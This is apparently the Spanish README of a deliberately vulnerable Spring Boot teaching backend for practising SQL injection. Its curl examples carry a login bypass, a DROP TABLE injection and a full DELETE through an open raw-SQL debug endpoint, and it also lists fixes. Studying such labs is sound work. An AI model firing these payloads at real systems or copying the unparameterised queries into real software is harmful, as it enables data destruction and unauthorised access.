# 🛡️ project_prograI_backend

> Un backend hecho con Spring Boot que sirve como **proyecto educativo** para experimentar vulnerabilidades de inyección SQL.  
> Ideal para que vean ejemplos prácticos de cómo se construyen consultas sin parametrizar y cómo se explotan.

🔗 **Repositorio principal:**  
https://github.com/Deivid-502/project_prograI_backend.git

---

## 🔀 Ramas del Proyecto

Este repositorio tiene tres ramas principales que manejan la configuración de forma distinta:

1. **`main`**
2. **`web-version`**
3. **`first-preview`**

### 1. `main`

- Es el merge final de `web-version`.
- Usa **archivos de configuración + variables de entorno** para la conexión a la base de datos.
- Diseñada para despliegues en la nube (por ejemplo, Heroku, Vercel, AWS).
- Si clonas sin indicar rama, quedarás en `main` por defecto.

### 2. `web-version`

- Es igual a `main` en estructura y comportamiento.
- Incluye:
    - **`src/main/resources/application.properties`**: configuraciones por defecto para entornos locales.
    - Opciones para sobrescribir la URL, usuario y contraseña de PostgreSQL con variables de entorno.
- Recomendado si planeas hacer deploy en un servidor público que gestione credenciales.

### 3. `first-preview`

- Versión “rápida” para desarrollo local **sin variables de entorno**.
- Todos los datos de conexión a la base de datos están **hardcodeados** en `application.properties`.
- Muy útil si quieres probar todo de inmediato y no preocuparte por configurar variables de entorno.

> 🔍 **Consejo**:
> - Para desplegar en la nube, usa `main` o `web-version`.
> - Para correr localmente sin cambiar nada, `first-preview` es la opción más sencilla.

---

## 📌 Requisitos Previos

Antes de arrancar este backend, asegúrate de tener instalado:

1. **Java 20**
    - Descárgalo de [jdk.java.net](https://jdk.java.net/20/) o usa un manejador como SDKMAN.
    - Verifica con:

   ```bash
   java -version
   ```

   Debe mostrar algo como:

   ```text
   openjdk version "20.0.x" 2023-xx-xx
   ```

2. **Maven 3.x**
    - Instálalo desde [maven.apache.org](https://maven.apache.org/) o usando tu gestor de paquetes (Homebrew, apt, etc.).
    - Comprueba con:

   ```bash
   mvn -v
   ```

   Debe mostrar:

   ```text
   Apache Maven 3.x.y
   Java version: 20.x.x, vendor: ...
   ```

3. **PostgreSQL**
    - Instala PostgreSQL localmente o usa una instancia en la nube (Heroku Postgres, ElephantSQL, AWS RDS, etc.).
    - Si es local, crea una base de datos llamada `projectdb` con un usuario y contraseña.
    - En `first-preview`, asegura que las credenciales en `application.properties` coincidan.

---

## ⚙️ Instalación y Ejecución (Desarrollo)

A continuación, instrucciones detalladas para cada rama. Escoge la que se ajuste a tu flujo de trabajo:

### 🔸 1. Rama `main` / `web-version` (uso de variables de entorno)

#### 1.1 Clonar y cambiar de rama

```bash
git clone https://github.com/Deivid-502/project_prograI_backend.git
cd project_prograI_backend
git checkout web-version   # O main; ambas están sincronizadas
```

#### 1.2 Configurar variables de entorno (opcional)

En `src/main/resources/application.properties` encontrarás valores por defecto:

```properties
spring.datasource.url=jdbc:postgresql://localhost:5432/projectdb
spring.datasource.username=postgres
spring.datasource.password=postgres
spring.jpa.hibernate.ddl-auto=create-drop
```

Para usar credenciales diferentes o una base en la nube, establece:

```bash
export SPRING_DATASOURCE_URL=jdbc:postgresql://<HOST>:<PUERTO>/<DB_NAME>
export SPRING_DATASOURCE_USERNAME=<USUARIO>
export SPRING_DATASOURCE_PASSWORD=<PASSWORD>
```

Ejemplo:

```bash
export SPRING_DATASOURCE_URL=jdbc:postgresql://db.example.com:5432/projectdb
export SPRING_DATASOURCE_USERNAME=myuser
export SPRING_DATASOURCE_PASSWORD=mysecretpassword
```

> ℹ️ Si no defines variables, Spring Boot usará los valores de `application.properties`.

#### 1.3 Instalar dependencias y compilar

```bash
mvn clean package
```

Esto creará `target/backend-1.0.0.jar`.

#### 1.4 Ejecutar la aplicación

```bash
java -jar target/backend-1.0.0.jar
```

- La app arranca en `http://localhost:8080/`.
- Gracias a `spring.jpa.hibernate.ddl-auto=create-drop`, las tablas se crean automáticamente.

---

### 🔹 2. Rama `first-preview` (sin variables de entorno)

#### 2.1 Clonar y cambiar de rama

```bash
git clone https://github.com/Deivid-502/project_prograI_backend.git
cd project_prograI_backend
git checkout first-preview
```

#### 2.2 Revisar `application.properties`

En `src/main/resources/application.properties` verás:

```properties
spring.datasource.url=jdbc:postgresql://localhost:5432/projectdb
spring.datasource.username=postgres
spring.datasource.password=postgres
spring.jpa.hibernate.ddl-auto=create-drop
```

- Edita si tu base de datos local usa otros valores.
- No hay variables de entorno: todo está fijo en el archivo.

#### 2.3 Instalar dependencias y compilar

```bash
mvn clean package
```

#### 2.4 Ejecutar la aplicación

```bash
java -jar target/backend-1.0.0.jar
```

- El backend correrá en `http://localhost:8080/` con la configuración de `application.properties`.

---

## 📋 Endpoints Disponibles

Todos los endpoints trabajan con JSON:

### 1. Autenticación

- **`POST /api/login`**
    - Body JSON:
      ```json
      { "username": "admin", "password": "admin123" }
      ```
    - Respuesta:
        - `"OK"` если credenciales correctas.
        - `"FAIL"` si no coinciden o hay error.

---

### 2. Productos (CRUD)

1. **`GET /api/products`**
    - Devuelve todos los productos:
      ```json
      [
        { "id": 1, "name": "Producto1", "description": "Desc1", "price": 10.5 }
      ]
      ```

2. **`GET /api/products/{id}`**
    - Producto con ID específico:
      ```json
      { "id": 1, "name": "Producto1", "description": "Desc1", "price": 10.5 }
      ```

3. **`POST /api/products`**
    - Crear nuevo producto.
    - Body:
      ```json
      { "name":"X", "description":"Y", "price":9.99 }
      ```
    - Respuesta: JSON del producto creado (con ID).

4. **`PUT /api/products/{id}`**
    - Editar producto existente.
    - Body similar a POST:
      ```json
      { "name":"Nuevo", "description":"<b>Negrita</b>", "price":5.0 }
      ```
    - Respuesta: Producto actualizado.

5. **`DELETE /api/products/{id}`**
    - Elimina el producto con ese ID.
    - Respuesta:
      ```json
      { "status": "deleted" }
      ```

---

### 3. Búsqueda Vulnerable

- **`GET /api/search/products?name=<texto>`**
    - Consulta SQL sin sanitizar el parámetro `name`.
    - Ejemplo:
      ```text
      GET /api/search/products?name=foo
      ```
    - Inyectar `name='foo' OR '1'='1` devuelve todos los productos.

---

### 4. Debug SQL

- **`POST /api/debug/query`**
    - Body:
      ```json
      { "sql":"TU SQL AQUÍ" }
      ```
    - Ejecuta la consulta y retorna:
        - Lista de filas (JSON array).
        - O `{ "error":"mensaje SQL" }` si falla.

---

## ✅ Pruebas desde Postman o CURL

> 🛠️ Asegúrate de que el backend esté corriendo en `http://localhost:8080`.

### 1. Bypass Login (SQL Injection)

**CURL**:
```bash
curl -X POST http://localhost:8080/api/login -H "Content-Type: application/json" -d '{ "username":"' OR '1'='1", "password":"foo" }'
```
- Resultado: `"OK"` sin credenciales válidas.

---

### 2. Crear Producto Malicioso (DROP TABLE)

**CURL**:
```bash
curl -X POST http://localhost:8080/api/products -H "Content-Type: application/json" -d '{ "name":"Test'); DROP TABLE products; --", "description":"x", "price":1 }'
```
- Riesgo: podría eliminar la tabla `products`.

---

### 3. Listar Productos

**CURL**:
```bash
curl http://localhost:8080/api/products
```
- Devuelve listado JSON.

---

### 4. Obtener Producto por ID

**CURL**:
```bash
curl http://localhost:8080/api/products/1
```
- Devuelve el producto con ID = 1.

---

### 5. Editar Producto (DOM Injection / HTML)

**CURL**:
```bash
curl -X PUT http://localhost:8080/api/products/1 -H "Content-Type: application/json" -d '{ "name":"Nuevo", "description":"<b>Negrita</b>", "price":5 }'
```
- Si el cliente no escapa `description`, ese HTML se renderizará.

---

### 6. Eliminar Producto

**CURL**:
```bash
curl -X DELETE http://localhost:8080/api/products/1
```
- Respuesta: `{ "status":"deleted" }`.

---

### 7. Consulta Directa (Debug SQL)

**CURL**:
```bash
curl -X POST http://localhost:8080/api/debug/query -H "Content-Type: application/json" -d '{ "sql":"SELECT count(*) FROM users" }'
```
- Ejemplo respuesta:
  ```json
  [ { "count":1 } ]
  ```

---

### 8. Eliminar Todo el Catálogo (SQL Injection)

**CURL**:
```bash
curl -X POST http://localhost:8080/api/debug/query -H "Content-Type: application/json" -d '{ "sql":"DELETE FROM products WHERE 1=1" }'
```
- Borrará todos los registros si no hay validación.

---

### 9. Prueba de Error de Sintaxis

**CURL**:
```bash
curl -X POST http://localhost:8080/api/debug/query -H "Content-Type: application/json" -d '{ "sql":"INVALID SQL" }'
```
- Respuesta esperada:
  ```json
  { "error":"ERROR: sintaxis inválida en ..." }
  ```

---

## 📂 Estructura del Proyecto

```
project_prograI_backend/
├── src/
│   ├── main/
│   │   ├── java/
│   │   │   └── com/
│   │   │       └── example/
│   │   │           └── backend/
│   │   │               ├── controllers/        # Controladores REST
│   │   │               ├── models/             # Entidades JPA (User.java, Product.java)
│   │   │               ├── repositories/       # Interfaces JPA (UserRepository, ProductRepository)
│   │   │               ├── services/           # Lógica de negocio (AuthService, ProductService)
│   │   │               └── BackendApplication.java  # @SpringBootApplication
│   │   └── resources/
│   │       ├── application.properties          # Configuración de datasource, JPA, etc.
│   │       └── data.sql                        # Scripts de datos de ejemplo (opcional)
│   └── test/
│       └── java/…                               # Pruebas unitarias (si se implementan)
│
├── pom.xml                                     # Dependencias y plugins de Maven
├── README.md                                   # Este archivo
└── …
```

> 🔎 En `main`/`web-version`, puedes sobrescribir `application.properties` con variables de entorno. En `first-preview`, todo está fijo en el archivo.

---

## 💾 Scripts y Builds

- **Compilar y empaquetar**:
  ```bash
  mvn clean package
  ```
    - Genera `target/backend-1.0.0.jar`.

- **Ejecutar**:
  ```bash
  java -jar target/backend-1.0.0.jar
  ```

- **Pruebas unitarias** (si se implementan):
  ```bash
  mvn test
  ```

---

## 🔍 ¿Por Qué Vale la Pena Revisar Este Backend?

- 🎓 **Material Educativo**: Ejemplos claros de consultas vulnerables y cómo explotarlas con inyección SQL.
- 🛠️ **Código Didáctico**: Cada controlador y servicio incluye comentarios sobre dónde está la vulnerabilidad y cómo corregirla.
- 🔓 **Práctica Directa**: Ejecuta peticiones maliciosas desde Postman o CURL y observa cómo falla la aplicación.
- 🏷️ **Spring Boot 3 + Java 20**: Código moderno, ideal para proyectos universitarios.

---

## 📈 Pasos Opcionales de Mejora

1. **Implementar parches**:
    - Reemplazar consultas vulnerables en `AuthService` por **queries parametrizadas**.
    - Usar `criteria` o `JPQL` en `ProductRepository` en lugar de concatenar strings.
    - Desactivar o proteger el endpoint **`/api/debug/query`** en producción (con autenticación JWT).

2. **Agregar seguridad**:
    - Integrar **Spring Security** o **JWT** para proteger rutas.
    - Asegurar que solo usuarios autenticados puedan ejecutar CRUD o `debug`.

3. **Despliegue en la nube**:
    - Crear base de datos en Heroku Postgres, ElephantSQL o AWS RDS.
    - Definir variables de entorno (`SPRING_DATASOURCE_URL`, `USERNAME`, `PASSWORD`).
    - Configurar CI/CD con GitHub Actions para desplegar `web-version` o `main`.

---
